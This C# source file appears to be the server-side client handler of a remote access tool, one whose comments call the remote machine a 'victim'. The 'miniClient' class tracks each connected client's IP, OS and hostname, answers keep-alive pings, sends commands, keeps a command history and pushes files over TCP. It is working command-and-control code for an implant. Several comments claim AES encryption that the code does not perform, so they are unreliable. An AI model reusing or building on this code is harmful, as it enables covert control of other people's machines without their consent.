using System;
using System.Text;
using System.Net.Sockets;
using System.Threading;
using System.IO;

namespace miniServer
{
    public class miniClient
    {
        /// <summary>
        /// Unique ID of client
        /// </summary>
        public int ID { get; }
        public TcpClient client { get; private set; }
        public string IP { get; }
        public string Port { get; }
        public string Version { get; }
        public Boolean Interact { get; set; }
        public Boolean IsAlive { get; set; }
        public string OS { get; set; }
        public string Note { get; set; }
        public string Recivedata { get; set; }
        public string HostName { get; private set; }
        public string CommandHistory { get; private set; }

        /// <summary>
        /// Save client connection information
        /// </summary>
        /// <param name="_id">Unique id of client</param>
        /// <param name="cryptoKey">AES crypto key</param>
        /// <param name="_client">Client connection object</param>
        /// <param name="_os">OS name and version</param>
        /// <param name="_version">Version of client that installed on victim</param>
        public miniClient(int _id, TcpClient _client, string _os, string clientVersion, string hostName = null)
        {
            ID = _id;
            client = _client;
            IP = client.Client.RemoteEndPoint.ToString().Split(':')[0];
            Port = client.Client.RemoteEndPoint.ToString().Split(':')[1];
            OS = _os;
            Version = clientVersion;
            IsAlive = true;
            HostName = hostName;
            this.Listen();
        }
        Thread thread;
        /// <summary>
        /// Listen  to Recivedata, stop old listen thread if exists
        /// </summary>
        public void Listen()
        {
            thread = new Thread(() => StartListen());
            thread.IsBackground = true;
            thread.Start();
        }
        private void StartListen()
        {
            NetworkStream clientStream = client.GetStream();
            try
            {
                while (IsAlive)
                {
                    if (client.Client.Poll((int)60 * 1000000, SelectMode.SelectRead) == true)//wait for data
                    {
                        if (clientStream.DataAvailable)// There is data waiting to be read
                        {
                            byte[] bytes = new byte[1024];
                            //int byteread = clientStream.Read(bytes, 0, bytes.Length);
                            int totalByteread = 0;

                            using (MemoryStream ms = new MemoryStream())
                            {
                                int numBytesRead;
                                do
                                {
                                    numBytesRead = clientStream.Read(bytes, 0, bytes.Length);
                                    if (numBytesRead > 0)
                                    {
                                        ms.Write(bytes, 0, numBytesRead);
                                        totalByteread += numBytesRead;
                                    }

                                    if (numBytesRead >= bytes.Length || clientStream.DataAvailable)
                                        Thread.Sleep(500);//read full array data more data exists, wait to be ready
                                } while (clientStream.DataAvailable == true);//Wait until data exists

                                bytes = ms.ToArray();
                            }

                            //System.Diagnostics.Debug.WriteLine("byte read=" + byteread.ToString());
                            //System.Diagnostics.Debug.WriteLine("DATA avail:" + clientStream.DataAvailable);

                            //Decode recived data
                            string incomming = Encoding.UTF8.GetString(bytes);

                            if (incomming == "IsServerAlive")
                                SendToClient("IamAlive");
                            else
                                Recivedata += incomming;
                            
                            
                        }
                    }
                }
            }
            catch (Exception x)
            { Recivedata += x.Message; }
            finally
            { clientStream.Close(); }
        }

        /// <summary>
        /// Disconnect TCP connection to client.
        /// </summary>
        public void Disconnect()
        {
            thread.Abort();
            client.Close();
        }
        /// <summary>
        /// Stop old listen, close connection, clear recive data, change tcp client and crypto key, start new listen
        /// </summary>
        /// <param name="newTcpClient">New tcp client</param>
        /// <param name="newKey">New AES key</param>
        public void RenewConnection(TcpClient newTcpClient, string newKey)
        {
            Disconnect();
            client = newTcpClient;
            Recivedata = "";
            IsAlive = true;
            Listen();
        }
        /// <summary>
        /// Get data and command encrypt it and send to client. 
        /// </summary>
        /// <param name="command">Command</param>
        public void SendToClient(string command)
        {
            CommandHistory += command + Environment.NewLine;
            UTF8Encoding UTFEncoder = new System.Text.UTF8Encoding();
            byte[] outStream = UTFEncoder.GetBytes(command);//Encode Message
            
            try
            {
                NetworkStream clientStream = client.GetStream();
                clientStream.Write(outStream, 0, outStream.Length);
                clientStream.Flush();
            }
            catch
            {

            }

        }
        /// <summary>
        /// Send Data like files to client.
        /// </summary>
        /// <param name="Data"></param>
        public void SendToClient(byte[] Data)
        {
            NetworkStream clientStream = client.GetStream();
            clientStream.Write(Data, 0, Data.Length);
            clientStream.Flush();
        }

    }
}
